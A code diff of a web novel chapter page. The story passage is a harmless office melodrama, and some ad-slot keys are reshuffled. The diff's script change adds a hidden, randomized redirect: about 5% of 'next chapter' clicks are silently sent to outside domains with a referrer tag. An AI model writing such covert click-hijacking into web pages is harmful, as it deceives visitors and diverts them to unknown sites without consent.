@@ -2391,31 +2391,31 @@
                 <p>Alexander&#39;s expression darkened. He reached for the tablet, swiping through the images. There he was, standing close to Evelyn Carter in the hospital corridor, his hand resting lightly on her arm. The angle made it seem far more personal than it had been.</p>
                 <p>Sebastian cleared his throat. &#34;Several media outlets reached out for comment before publishing. They wanted your approval.&#34;</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
+                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
                 <p>Alexander scoffed, tossing the tablet onto the desk. &#34;As if they need my permission. They&#39;re just covering their backs.&#34;</p>
                 <p>Across town, Cassandra Winslow stormed into her brother Sebastian Winslow&#39;s office, her heels clicking sharply against the marble floor.</p>
                 <p>&#34;You&#39;ve been avoiding me,&#34; she accused, slamming her palms onto his desk.</p>
                 <p>Sebastian jumped, nearly spilling his coffee. &#34;What? No, I haven&#39;t.&#34;</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
+                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
                 <p>Cassandra crossed her arms. &#34;Don&#39;t lie. I know you met with Alexander. What aren&#39;t you telling me?&#34;</p>
                 <p>Sebastian wiped his hands on a napkin, avoiding her gaze. &#34;It&#39;s nothing. Just business.&#34;</p>
                 <p>&#34;Business?&#34; Cassandra scoffed. She grabbed his tie, yanking him forward. &#34;Try again.&#34;</p>
                 <p>Sebastian choked, his face turning red. &#34;Cass—let go—&#34;</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
+                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
                 <p>Employees in the open office space froze, watching the scene unfold.</p>
                 <p>Cassandra ignored them, dragging him toward his private office. &#34;We&#39;re talking. Now.&#34;</p>
                 <p>Sebastian stumbled after her, gasping for air. &#34;You&#39;re insane!&#34;</p>
                 <p>She shoved him inside and slammed the door. &#34;Start talking.&#34;</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
+                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
                 <p>Sebastian loosened his tie, glaring. &#34;Fine! You want the truth? Alexander&#39;s involved with Evelyn Carter. And it&#39;s complicated.&#34;</p>
                 <p>Cassandra&#39;s eyes flashed. &#34;How complicated?&#34;</p>
                 <p>Sebastian exhaled sharply. &#34;The kind that could ruin everything.&#34;</p>
                 <p>A tense silence settled between them.</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
+                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
                 <p>Cassandra clenched her fists. &#34;Then we fix it.&#34;</p>
                 <p>Sebastian shook his head. &#34;You don&#39;t understand. This isn&#39;t something we can just—&#34;</p>
                 <p>She cut him off. &#34;Watch me.&#34;</p>
@@ -2543,7 +2543,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2559,8 +2559,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
